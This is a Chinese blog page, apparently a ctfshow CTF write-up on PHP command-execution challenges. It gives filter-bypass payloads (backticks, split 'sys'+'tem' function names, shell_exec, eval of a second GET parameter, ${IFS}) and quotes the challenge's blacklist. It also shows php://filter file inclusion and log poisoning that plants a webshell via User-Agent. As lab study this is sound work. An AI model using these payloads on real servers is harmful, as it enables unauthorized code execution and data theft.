+</ul>
+<hr>
+<h3 id="2-反引号执行命令"><a href="#2-反引号执行命令" class="headerlink" title="2. 反引号执行命令"></a><strong>2. 反引号执行命令</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">echo</span> `tac fla*`;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><strong>功能</strong>：反引号 &#96;&#96;&#96; 是 <code>shell_exec()</code> 的简写，执行命令并返回输出。</p>
+</li>
+<li><p><strong>特点</strong>：</p>
+<ul>
+<li>需配合 <code>echo</code> 显示结果。</li>
+<li>反引号可能在过滤规则中被忽略（尤其是简单正则）。</li>
+</ul>
+</li>
+<li><p><strong>绕过场景</strong>：</p>
+<ul>
+<li><p>过滤了函数名（如 <code>system</code>、<code>shell_exec</code>），但未过滤反引号。</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250729202252345.png" alt="image-20250729202252345" data-caption="image-20250729202252345" loading="lazy"></p>
+</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="3-字符串拼接函数名"><a href="#3-字符串拼接函数名" class="headerlink" title="3. 字符串拼接函数名"></a><strong>3. 字符串拼接函数名</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="variable">$a</span>=sys;<span class="variable">$b</span>=tem;<span class="variable">$c</span>=<span class="variable">$a</span>.<span class="variable">$b</span>;<span class="variable">$c</span>(<span class="string">&quot;tac fla*&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><strong>功能</strong>：通过拼接 <code>sys</code> + <code>tem</code> 动态生成 <code>system</code> 函数名。</p>
+</li>
+<li><p><strong>特点</strong>：</p>
+<ul>
+<li>绕过对完整函数名的黑名单过滤。</li>
+<li>依赖 PHP 的变量解析特性。</li>
+</ul>
+</li>
+<li><p><strong>绕过场景</strong>：</p>
+<ul>
+<li><p>过滤了 <code>system</code> 但允许动态变量调用。</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250729202326671.png" alt="image-20250729202326671" data-caption="image-20250729202326671" loading="lazy"></p>
+</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="4-shell-exec-echo"><a href="#4-shell-exec-echo" class="headerlink" title="4. shell_exec + echo"></a><strong>4. <code>shell_exec</code> + <code>echo</code></strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;tac fla*&quot;</span>);<span class="comment">//注意shell_exec必须配合echo使用</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><strong>功能</strong>：通过 <code>shell_exec</code> 执行命令并显式输出。</p>
+</li>
+<li><p><strong>特点</strong>：</p>
+<ul>
+<li>必须用 <code>echo</code> 显示结果（<code>shell_exec</code> 默认不输出）。</li>
+<li>比 <code>system</code> 更隐蔽，适合无回显场景。</li>
+</ul>
+</li>
+<li><p><strong>绕过场景</strong>：</p>
+<ul>
+<li><p>过滤了 <code>system</code> 但未过滤 <code>shell_exec</code>。</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250729202436777.png" alt="image-20250729202436777" data-caption="image-20250729202436777" loading="lazy"></p>
+</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="5-eval-动态执行-GET-参数"><a href="#5-eval-动态执行-GET-参数" class="headerlink" title="5. eval 动态执行 GET 参数"></a><strong>5. <code>eval</code> 动态执行 GET 参数</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&quot;tac flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><strong>功能</strong>：利用 <code>eval</code> 执行另一个 GET 参数中的代码。</p>
+</li>
+<li><p><strong>特点</strong>：</p>
+<ul>
+<li>高度灵活，可嵌套多层绕过。</li>
+<li>依赖 <code>eval</code> 未被禁用。</li>
+</ul>
+</li>
+<li><p><strong>绕过场景</strong>：</p>
+<ul>
+<li><p>需要绕过对直接命令执行的过滤时（如 <code>system</code> 被过滤，但 <code>eval</code> 可用）。</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250729202710673.png" alt="image-20250729202710673" data-caption="image-20250729202710673" loading="lazy"></p>
+</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="综合对比与推荐"><a href="#综合对比与推荐" class="headerlink" title="综合对比与推荐"></a><strong>综合对比与推荐</strong></h3><table>
+<thead>
+<tr>
+<th align="left">方法</th>
+<th align="left">优势</th>
+<th align="left">限制</th>
+<th align="left">适用场景</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>passthru</code></td>
+<td align="left">直接输出，无需 <code>echo</code></td>
+<td align="left">可能被过滤</td>
+<td align="left">需要快速显示二进制数据</td>
+</tr>
+<tr>
+<td align="left">反引号</td>
+<td align="left">语法简单，易绕过过滤</td>
+<td align="left">需 <code>echo</code></td>
+<td align="left">过滤了函数名但未过滤反引号</td>
+</tr>
+<tr>
+<td align="left">字符串拼接</td>
+<td align="left">绕过静态函数名过滤</td>
+<td align="left">依赖 PHP 变量解析</td>
+<td align="left">黑名单过滤严格时</td>
+</tr>
+<tr>
+<td align="left"><code>shell_exec</code></td>
+<td align="left">隐蔽性强</td>
+<td align="left">需echo显式输出</td>
+<td align="left">无回显或需要结果处理</td>
+</tr>
+<tr>
+<td align="left"><code>eval</code> + 参数</td>
+<td align="left">高度灵活</td>
+<td align="left">需 <code>eval</code> 可用</td>
+<td align="left">多层绕过复杂过滤</td>
+</tr>
+</tbody></table>
+<h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250729203413032.png" alt="image-20250729203413032" data-caption="image-20250729203413032" loading="lazy"></p>
+<p>空格可以使用${IFS}代替</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250729203726973.png" alt="image-20250729203726973" data-caption="image-20250729203726973" loading="lazy"></p>
+<p>?c&#x3D;eval($_GET[1]);&amp;1&#x3D;system(“tac flag.php”);</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250729204652153.png" alt="image-20250729204652153" data-caption="image-20250729204652153" loading="lazy"></p>
+<h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250729205049846.png" alt="image-20250729205049846" data-caption="image-20250729205049846" loading="lazy"></p>
+<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>过滤掉了flag|system|php|cat|sort|shell|.| |’|&#96;|echo|;|( 包括点，单引号，反引号，分号，括号<br>再像前几关一样直接输入命令执行不大可能了，因为括号，分号，反引号都被过滤掉了，但是php中也有不需要括号的函数，如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="number">123</span>;</span><br><span class="line"><span class="keyword">die</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;etc/passwd&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这里我们利用include构造payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/?c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250729205715407.png" alt="image-20250729205715407" data-caption="image-20250729205715407" loading="lazy"></p>
+<p>其中?&gt;代替分号，后面的?&gt;的作用是作为绕过分号，作为语句的结束。原理是：php遇到定界符关闭标签会自动在末尾加上一个分号。简单来说，就是php文件中最后一句在?&gt;前可以不写分号。</p>
+<p>页面显示flag.php内容的base64编码，解码即可获取flag</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250729210258347.png" alt="image-20250729210258347" data-caption="image-20250729210258347" loading="lazy"></p>
+<h2 id="日志注入"><a href="#日志注入" class="headerlink" title="日志注入"></a>日志注入</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/?c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]?%<span class="number">3</span>E&amp;<span class="number">1</span>=../../../../<span class="keyword">var</span>/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log是nginx默认的access日志路径，访问该路径时，在User-Agent中写入一句话木马，然后用中国蚁剑连接即可</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250729210455082.png" alt="image-20250729210455082" data-caption="image-20250729210455082" loading="lazy"></p>
+
+    
+  </article>
+
+  
+      
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+   
+    
+        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/ctfshow/" rel="tag">ctfshow</a> <a class="nexmoefont icon-tag-fill -none-link" href="/tags/web%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">web命令执行</a>
+    
+</div>
+  
+  
+    <script async src="/js/copy-codeblock.js?v=1761989925211"></script>
+  
+
+  
+      <div class="nexmoe-post-footer">
+          
+      </div>
+  
+</div></div><div class="nexmoe-post-right">    <div class="nexmoe-fixed">
+        <div class="nexmoe-tool">
+
+            
+
+            
+            
+            <button class="mdui-fab catalog" style="overflow:unset;">
+                <i class="nexmoefont icon-i-catalog"></i>
+                <div class="nexmoe-toc">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web29"><span class="toc-number">1.</span> <span class="toc-text">web29</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B8%E5%9E%8B%E7%9A%84-Web-Shell-%E6%88%96%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E7%9A%84%E7%A4%BA%E4%BE%8B"><span class="toc-number">2.</span> <span class="toc-text">典型的 Web Shell 或代码执行漏洞 的示例</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%8A%9F%E8%83%BD%E8%A7%A3%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">代码功能解析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">2.2.0.1.</span> <span class="toc-text">直接执行系统命令</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E5%9C%A8-CTF-%E4%B8%AD%E7%94%A8-tac%EF%BC%9F"><span class="toc-number">2.2.1.</span> <span class="toc-text">为什么在 CTF 中用 tac？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C"><span class="toc-number">2.3.</span> <span class="toc-text">操作</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-c-system-%E2%80%9Cls%E2%80%9D"><span class="toc-number">2.3.1.</span> <span class="toc-text">1.?c&#x3D;system(“ls”);</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-c-system-%E2%80%9Ctac-fla-php%E2%80%9D"><span class="toc-number">2.3.2.</span> <span class="toc-text">2.?c&#x3D;system(“tac fla*.php”);</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-c-system-%E2%80%9Ccat-fla-php%E2%80%9D"><span class="toc-number">2.3.3.</span> <span class="toc-text">3.?c&#x3D;system(“cat fla*.php”);</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%9A%81%E5%89%91"><span class="toc-number">2.3.4.</span> <span class="toc-text">4.蚁剑</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web30"><span class="toc-number">2.4.</span> <span class="toc-text">web30</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-passthru-tac-fla"><span class="toc-number">2.4.1.</span> <span class="toc-text">1. passthru(&quot;tac fla\*&quot;)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8F%8D%E5%BC%95%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">2.4.2.</span> <span class="toc-text">2. 反引号执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5%E5%87%BD%E6%95%B0%E5%90%8D"><span class="toc-number">2.4.3.</span> <span class="toc-text">3. 字符串拼接函数名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-shell-exec-echo"><span class="toc-number">2.4.4.</span> <span class="toc-text">4. shell_exec + echo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-eval-%E5%8A%A8%E6%80%81%E6%89%A7%E8%A1%8C-GET-%E5%8F%82%E6%95%B0"><span class="toc-number">2.4.5.</span> <span class="toc-text">5. eval 动态执行 GET 参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%BC%E5%90%88%E5%AF%B9%E6%AF%94%E4%B8%8E%E6%8E%A8%E8%8D%90"><span class="toc-number">2.4.6.</span> <span class="toc-text">综合对比与推荐</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web31"><span class="toc-number">2.5.</span> <span class="toc-text">web31</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web32"><span class="toc-number">2.6.</span> <span class="toc-text">web32</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.7.</span> <span class="toc-text">文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5"><span class="toc-number">2.8.</span> <span class="toc-text">日志注入</span></a></li></ol></li></ol>
+                </div>
+            </button>
+            
+
+            
+
+            <a href="#nexmoe-content" class="backtop toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+        </div>
+    </div>
+</div></div><div id="nexmoe-footer"><!--!--></div><div id="nexmoe-search-space"><div class="search-container"><div class="search-header"><div class="search-input-container"><input class="search-input" type="text" placeholder="搜索" onInput="sinput();"></div><a class="search-close" onclick="sclose();">×</a></div><div class="search-body"></div></div></div><div><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2058306854838448" crossorigin="anonymous"></script>
+</div></body></html>
